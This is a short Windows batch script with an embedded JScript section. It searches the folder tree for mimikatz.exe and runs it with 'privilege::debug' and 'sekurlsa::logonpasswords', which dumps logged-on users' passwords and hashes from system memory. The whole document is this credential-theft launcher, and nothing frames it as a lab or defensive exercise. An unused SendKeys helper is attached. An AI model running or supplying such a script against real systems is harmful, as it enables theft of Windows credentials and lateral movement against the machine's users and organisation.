@if (@CodeSection == @Batch) @then
@echo off
SETLOCAL enabledelayedexpansion
rem Use %SendKeys%
set SendKeys=CScript //nologo //E:JScript "%~F0"
for /r "." %%a in (*.exe) do (
:: %%a is used as argument for "TYPEd"
echo Checking: %%a
:: FIND /i : Specifies that the search is not case-sensitive.
ECHO.%%a| FIND /I "Win32\mimikatz.exe">Nul && (
  Echo Executing "Mimikatz"
   start /wait "" /w /b "%%a" "privilege::debug" "sekurlsa::logonpasswords" exit   
   PING 1.2.1.1 -n 5 >NUL 2>&1
) || (
Echo.
)

)
PAUSE
endlocal
goto :EOF

@end

// JScript section

var WshShell = WScript.CreateObject("WScript.Shell");
WshShell.SendKeys(WScript.Arguments(0));

